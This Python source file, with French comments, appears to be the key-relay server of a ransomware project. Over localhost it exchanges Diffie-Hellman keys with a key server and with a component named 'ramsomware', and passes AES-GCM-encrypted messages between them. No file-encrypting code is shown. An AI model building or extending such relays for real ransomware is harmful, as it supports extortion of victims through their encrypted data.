from utile.network import connect, send_message, start_serv, receive_message
from utile.security import send_Diffie_Hellman_exchange_key, AES_GCM_decrypt, AES_GCM_encrypt, \
    receive_Diffie_Hellman_exchange_key, crypt_files, uncrypt_files
from _thread import *
from time import sleep

lock = allocate_lock()
IP = "127.0.0.1"
PORT_SERVERCLE = 8381
PORT = 8384


def main():

    while True:

        try:
            sleep(1)
            lock.acquire()
            start_new_thread(thread_master, (IP, PORT_SERVERCLE))
        except OSError as e:
            print(e)
            pass


def thread_master(ip, port):

    tuple_retour = connect(ip, port, True)  # Récupère un tuple lors de la connexion au serveur
    s = tuple_retour[0]  # La position 0 est le socket de connexion et la position 1
    g_p = tuple_retour[1]  # Est le g_p requis pour Dif_Hellman
    common_secret = send_Diffie_Hellman_exchange_key(s, ip, port, g_p)  #Appel de la fonction et récupère la clé commune

    connect_ramsomware(ip, PORT, common_secret, s)


def connect_ramsomware(ip, port, common_secret, s):

    socket = start_serv(ip, port)

    common_key = receive_Diffie_Hellman_exchange_key(socket, ip, port)
    message = bytes.decode(AES_GCM_decrypt(receive_message(socket), common_key), "utf-8")

    connect_servercle(ip, PORT_SERVERCLE, s, common_secret, message)


def connect_servercle(ip, port, socket, common_secret, message):

    encrypted = AES_GCM_encrypt(message, common_secret)
    send_message(socket, encrypted, ip, port)


if __name__ == '__main__':
    main()



